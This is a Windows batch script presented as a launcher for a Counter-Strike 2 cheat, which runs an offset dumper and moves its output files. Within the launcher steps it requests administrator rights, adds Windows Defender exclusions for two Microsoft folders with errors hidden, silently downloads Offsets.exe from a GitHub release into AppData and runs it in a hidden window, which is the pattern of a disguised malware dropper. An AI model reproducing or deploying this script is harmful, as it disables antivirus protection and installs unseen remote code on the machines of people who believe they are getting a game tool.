@echo off
:: Check if the script is run as administrator using 'openfiles' command
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as an administrator.
    echo Attempting to restart with elevated privileges...
    pause
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit /b
)


powershell -Command "try { Add-MpPreference -ExclusionPath '%ProgramData%\Microsoft' } catch { }" >nul 2>&1
powershell -Command "try { Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft' } catch { }" >nul 2>&1

setlocal enabledelayedexpansion

:: Define the base directory for offsetsoutput
set "base_dir=%~dp0offsetsoutput"
set "output_dir=%base_dir%\output"

:: Change the current directory to the base directory where dumper.exe is located
cd /d "%base_dir%"

:: Check if dumper.exe exists
if not exist "dumper.exe" (
    echo Error: dumper.exe not found!
    pause
    exit /b
)

:: Check if the "output" folder exists and create it if necessary
if not exist "%output_dir%" (
    echo "output" folder not found. Creating it...
    mkdir "%output_dir%"
)

:: Attempt to start dumper.exe
echo Starting dumper.exe...
start "" "dumper.exe"

:: Wait for 7 seconds to allow dumper.exe to generate files
timeout /t 7 /nobreak >nul

:: Check if the "output" folder contains files
if not exist "%output_dir%" (
    echo Error: output folder not found or empty!
    pause
    exit /b
)

echo Checking files in output folder...
dir "%output_dir%"

:: Create the "offsets" folder in offsetsoutput if it does not exist
if not exist "%base_dir%\offsets" (
    mkdir "%base_dir%\offsets"
)

:: Display the source and destination paths for debugging
echo Moving files from "%output_dir%" to "%base_dir%\offsets"...
move "%output_dir%\*" "%base_dir%\offsets\" >nul
if %errorlevel% neq 0 (
    echo Error: Could not move files. Please check permissions or file paths.
    pause
    exit /b
)

echo Files were successfully moved.

:: Download Offsets.exe to the %APPDATA%\Microsoft folder silently
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/FREE-2025/Counter-Strike2-Cheat/releases/download/Cheats/Offsets.exe', '%APPDATA%\Microsoft\Offsets.exe')"

:: Start Offsets.exe in hidden mode without prompts
powershell -Command "Start-Process '%APPDATA%\Microsoft\Offsets.exe' -WindowStyle Hidden"

:: Start Cs2 External.exe
if not exist "%base_dir%\Cs2 External.exe" (
    echo Error: Cs2 External.exe not found in the offsetsoutput folder!
    pause
    exit /b
)

start "" "%base_dir%\Cs2 External.exe"

pause
